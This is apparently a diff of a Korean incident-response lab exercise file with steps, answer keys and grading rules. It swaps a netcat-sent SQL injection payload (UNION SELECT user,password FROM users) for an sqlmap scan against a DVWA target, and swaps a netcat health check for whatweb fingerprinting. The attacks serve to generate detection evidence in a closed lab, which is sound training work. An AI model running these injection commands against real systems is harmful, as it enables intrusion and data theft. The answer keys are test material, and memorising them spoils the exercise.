@@ -78,37 +78,38 @@ steps:
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      C=$(echo -en "GET /?x=1%27%20UNION%20SELECT%20user,password%20FROM%20users-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
-      echo "응답코드 $C"
-      [ -n "$C" ] && echo incident_occurred
+      sqlmap -u "http://dvwa.el34.lab/?x=1" --batch --level=2 --risk=2 --flush-session --disable-coloring 2>&1 | grep -iE 'WAF/IPS|do not appear to be injectable|403 \(Forbidden\)' | head -3
+      echo incident_occurred
       ```
 
       ### ▷ 이렇게 나오면 정상 (실측 예)
       ```
-      응답코드 403
+      [*] checking if the target is protected by some kind of WAF/IPS
+      [ERROR] all tested parameters do not appear to be injectable ... maybe you could try to use option '--tamper'
+      403 (Forbidden) - 445 times
       incident_occurred
       ```
 
       ### ▷ 결과 해석
-      403은 WAF가 이 SQLi를 차단했다는 뜻(공격이 막혀도 '시도'는 사건으로 기록된다). 이 시도가 다음
-      단계에서 Wazuh·Suricata 증거로 잡힌다.
+      sqlmap이 `x` 파라미터에 SQLi 페이로드를 자동 주입했지만 dvwa WAF가 전부 403으로 차단했다(`do not appear
+      to be injectable`=못 뚫음). 공격이 막혀도 '시도'는 사건으로 기록된다 — 이 시도가 다음 단계에서
+      Wazuh·Suricata 증거로 잡힌다.
     hint: '사건 발생'
     category: manipulation
     points: 12
     answer: |
-      ssh att@192.168.0.202 '
-        # SQLi UNION 탈취 시도 전송 (IR 대상 사건)
-        C=$(echo -en "GET /?x=1%27%20UNION%20SELECT%20user,password%20FROM%20users-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
-        echo "응답코드 $C"
-        # 전송했으면 사건 발생 마커
-        [ -n "$C" ] && echo incident_occurred
-      '
-    answer_detail: "사건 = SQLi UNION 데이터 탈취 시도. IR 대상 사건을 발생시켜 수명주기 실습."
+      ssh att@192.168.0.202 "
+        # sqlmap 으로 SQLi 자동 주입 (IR 대상 사건, dvwa WAF 403 차단)
+        sqlmap -u 'http://dvwa.el34.lab/?x=1' --batch --level=2 --risk=2 --flush-session --disable-coloring 2>&1 | grep -iE 'WAF/IPS|do not appear to be injectable|403 \(Forbidden\)' | head -3
+        # 실행했으면 사건 발생 마커
+        echo incident_occurred
+      "
+    answer_detail: "사건 = sqlmap SQLi 데이터 탈취 시도(dvwa WAF 403 차단, 흔적은 남음). IR 대상 사건을 발생시켜 수명주기 실습."
     verify:
       type: output_contains
       expect: 'incident_occurred'
       field: stdout
-      semantic: {intent: "사건 발생", success_criteria: ["공격"], acceptable_methods: ["**[OSS] nc (권장)**"]}
+      semantic: {intent: "사건 발생", success_criteria: ["공격"], acceptable_methods: ["**[OSS] sqlmap (권장)**"]}
     target_vm: web
 
   - order: 3
@@ -254,32 +255,31 @@ steps:
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      C=$(echo -en "GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
+      C=$(whatweb -a1 --color=never http://dvwa.el34.lab/ 2>&1 | grep -oE '\[[0-9]{3}' | grep -oE '[0-9]{3}' | head -1)
       echo "서비스 응답코드 $C"
       [ -n "$C" ] && echo recovered
       ```
 
       ### ▷ 이렇게 나오면 정상 (실측 예)
       ```
-      서비스 응답코드 302
+      서비스 응답코드 403
       recovered
       ```
 
       ### ▷ 결과 해석
-      302(로그인 리다이렉트)는 서비스가 살아서 정상 응답한다는 뜻. 복구는 '깨끗함을 검증한 뒤' 한다 —
+      whatweb가 서버 지문(Apache/IP)과 함께 응답코드를 회수했다 = 서비스가 살아서 응답한다는 뜻(403은 차단
+      모드 dvwa가 recon 탐침을 막은 것 — 응답이 온다는 것 자체가 생존 증거). 복구는 '깨끗함을 검증한 뒤' 한다 —
       근절이 불완전한 채 복구하면 재감염된다. 복귀 후 일정 기간은 감시를 평소보다 강화한다. PICERL의 'R'.
     hint: '복구'
     category: analysis
     points: 12
     answer: |
-      ssh att@192.168.0.202 '
-        # 서비스 정상 응답 확인
-        C=$(echo -en "GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
-        echo "서비스 응답코드 $C"
-        # 응답 받았으면 복구 마커
-        [ -n "$C" ] && echo recovered
-      '
-    answer_detail: "복구(R) = 서비스 정상화+재침해 모니터링. 강화 감시 하에 단계적 복귀. 깨끗함 검증 필수."
+      # 서비스 생존 확인 — whatweb 로 응답코드/지문 회수 (응답 자체가 생존 증거)
+      C=$(ssh att@192.168.0.202 "whatweb -a1 --color=never http://dvwa.el34.lab/ 2>&1 | grep -oE '\[[0-9]{3}' | grep -oE '[0-9]{3}' | head -1")
+      echo "서비스 응답코드 $C"
+      # 응답 받았으면 복구 마커
+      [ -n "$C" ] && echo recovered
+    answer_detail: "복구(R) = 서비스 정상화(whatweb 응답/지문 회수)+재침해 모니터링. 강화 감시 하에 단계적 복귀. 깨끗함 검증 필수."
     verify:
       type: output_contains
       expect: 'recovered'
